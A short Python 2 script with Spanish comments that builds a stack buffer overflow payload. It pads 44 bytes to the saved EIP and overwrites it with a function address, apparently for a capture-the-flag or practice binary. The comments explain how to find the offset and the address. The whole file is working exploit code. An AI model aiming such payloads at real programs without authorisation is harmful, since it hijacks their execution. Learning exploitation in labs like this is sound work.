import struct

#importamos el modulo struct para poder trabajar con integers y striings 
#offset a EIP en 44 estp lo podemos determinar luego de analizar donde se producer el crash
#msf-pattern_create en kali o cyclic en pwntools me ayudaran a esto
pattern = "A" * 44
#creamos el payload que enviarmeos como input
payload = pattern
payload += struct.pack("I", 0x08049192) #podemos ver cual es la funcion a la que podemos apunrtar desde gdb, para luego "epackarla" con el mopdulo struct

print payload #imprimimos el payload, podemos pasarlo a un archivo redirigendo el output
